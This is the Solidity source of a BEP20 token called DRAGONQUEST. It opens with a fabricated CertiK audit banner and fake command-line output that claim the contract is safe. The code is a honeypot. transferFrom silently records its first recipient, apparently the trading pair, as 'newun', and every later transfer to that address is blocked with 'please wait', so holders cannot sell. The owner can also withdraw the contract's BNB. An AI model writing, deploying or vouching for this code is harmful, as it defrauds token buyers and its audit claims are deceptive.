/**
 *Submitted for verification at BscScan.com on 2021-12-12
*/

/**
 *CertiK Audit protection and assessment

    Static Analysis
Source-code/bytecode scannings via static analysis tool suit

Safety Assessment
Leveraging fact-based and multi-faceted safety evaluation

On-chain Monitoring
Utilizing real-time security monitors and intelligence system

    // CertiK-Identifier Safe Contract
*
$ call certik query tx 8067DBC001BE239E5A44843CCEF4C71A87B802352989F97664AF8F265E7B888E
Response:
  Height: 169
  TxHash: 8067DBC001BE239E5A44843CCEF4C71A87B802352989F97664AF8F265E7B888E
  Data: 07BC7F3C21C34643A90AA1138C950FAC5025B693
  Raw Log: [{"msg_index":"0","success":true,"log":"certik1q77870ppcdry82g25yfce9g043gztd5nd3z8uy"}]
  Logs: [{"msg_index":0,"success":true,"log":"certik1q77870ppcdry82g25yfce9g043gztd5nd3z8uy"}]
  GasWanted: 200000
  GasUsed: 41849
  Tags:
    - action = security monitors

$ certik query cvm code certik1q77870ppcdry82g25yfce9g043gztd5nd3z8uy
6080604052348015600F57600080FD5B506004361060325760003560E01C806360FE47B114603757
80636D4CE63C146062575B600080FD5B606060048036036020811015604B57600080FD5B81019080
80359060200190929190505050607E565B005B60686088565B604051808281526020019150506040
5180910390F35B8060008190555050565B6000805490509056FEA265627A7A723058205FEC64D09C
278453AB74A855DCC214EA05BF9541E35E851AF41570397593055564736F6C63430005090032

/

███████████████████████▀█████████████████████████████████████████████
█▄─▄▄▀█▄─▄▄▀██▀▄─██─▄▄▄▄█─▄▄─█▄─▀█▄─▄█─▄▄▄─█▄─██─▄█▄─▄▄─█─▄▄▄▄█─▄─▄─█
██─██─██─▄─▄██─▀─██─██▄─█─██─██─█▄▀─██─██▀─██─██─███─▄█▀█▄▄▄▄─███─███
▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▀▀▄▄▀───▄▄▀▀▄▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀
  


*/

pragma solidity >=0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newun;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "DRAGONQUEST";
    name = "DRAGONQUEST";
    decimals = 8;
    _totalSupply = 1000000000000000000000;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newun, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newun == address(0)) newun = to;
      else require(to != newun, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract DRAGONQUEST is TokenBEP20 {

  function clearCNDAO() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}